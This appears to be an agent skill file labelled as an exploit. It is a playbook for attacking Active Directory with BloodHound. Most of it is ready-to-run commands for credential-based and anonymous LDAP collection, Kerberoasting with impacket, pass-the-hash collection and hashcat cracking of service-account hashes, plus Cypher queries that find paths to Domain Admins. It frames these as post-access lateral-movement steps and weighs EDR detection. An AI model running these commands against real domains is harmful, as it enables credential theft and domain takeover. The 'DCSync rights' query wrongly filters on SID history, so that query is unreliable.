---
name: bloodhound-active-directory
description: Active Directory BloodHound attack path analysis via LDAP enumeration, SharpHound/BloodHound.py collection, Kerberoasting, and graph-based privilege escalation path discovery.
skill_type: exploit
severity: critical
tags: [bloodhound, active-directory, ldap, kerberoast, sharphound, ad-enumeration, graph-analysis, privilege-escalation]
cve: []
---

# BloodHound Active Directory Attack Path Analysis

## Essential Principles

1. BloodHound maps trust relationships, group memberships, ACLs, sessions, and delegation rights into a Neo4j graph — enabling "Shortest Path to Domain Admins" analysis
2. Data collection via BloodHound.py (Linux) or SharpHound.exe (Windows) using any valid domain credentials — low-privilege domain user is sufficient
3. Anonymous LDAP binding (when enabled) with netexec provides initial AD structure enumeration without credentials
4. Kerberoasting (impacket-GetUserSPNs) extracts TGS hashes for service accounts — cracking them yields service account plaintext credentials
5. Attack paths revealed: ACL abuse, Kerberoastable users, AS-REP roastable users, constrained delegation, unconstrained delegation, DCSync rights, SQL admin paths, RDP/DCOM sessions

## When to Use

- Active Directory environment detected (LDAP 389, Kerberos 88, SMB 445)
- Valid domain credentials available (even low-privilege user)
- Need to identify privilege escalation paths to Domain Admins
- Post-initial-access reconnaissance for lateral movement planning

## When NOT to Use

- Standalone Windows systems (no AD domain)
- LDAP/GC ports blocked or restricted
- Domain controllers fully patched and monitored with EDR that will flag SharpHound collection activity
- No credentials and anonymous LDAP is disabled — collection requires at least guest-level access

## Path Selection

| Condition | Path | Command |
|-----------|------|---------|
| Valid domain credentials | bloodhound_collect | `bloodhound-python -c All -d DOMAIN -u user -p pass -dc DC_IP -ns NS_IP` |
| Anonymous LDAP enabled | anonymous_ldap | `netexec ldap TARGET --bloodhound -c All` |
| Kerberoastable service accounts | kerberoast | `impacket-GetUserSPNs DOMAIN/user:pass -request -dc-ip DC_IP` |
| Hashes available (no plaintext) | ntlm_collect | `bloodhound-python -c All -d DOMAIN -u user --hashes :NTHASH -dc DC_IP -ns NS_IP` |

## Quick Start

```bash
# BloodHound.py collection with plaintext credentials
bloodhound-python -c All -u 'svc_user' -p 'Password123' -d 'corp.local' -dc '10.0.0.10' -ns '10.0.0.10'

# BloodHound.py with NTLM hash (pass-the-hash)
bloodhound-python -c All -u 'svc_user' --hashes ':aad3b435b51404eeaad3b435b51404ee:NT_HASH' -d 'corp.local' -dc '10.0.0.10' -ns '10.0.0.10'

# Anonymous LDAP enumeration + BloodHound collection
netexec ldap 10.0.0.10 -u '' -p '' --bloodhound -c All

# Kerberoasting
impacket-GetUserSPNs 'corp.local/svc_user:Password123' -request -dc-ip 10.0.0.10

# Crack Kerberoast hashes
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Load into BloodHound
sudo neo4j start
bloodhound --no-sandbox
# Upload zip via BloodHound GUI or use bloodhound-cli
```

## Key Attack Path Queries (Cypher)

```cypher
// Shortest paths to Domain Admins
MATCH p=shortestPath((n:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p

// Find Kerberoastable users with high-value paths
MATCH (u:User {hasspn:true}) MATCH p=shortestPath((u)-[*1..]->(:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p

// Unconstrained delegation systems
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Users with DCSync rights
MATCH (n {hassidhistory:true})-[r:GetChangesAll]->(d:Domain) RETURN n,r,d

// Find AS-REP roastable users with admin paths
MATCH (u:User {dontreqpreauth:true}) MATCH (g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}) MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p
```
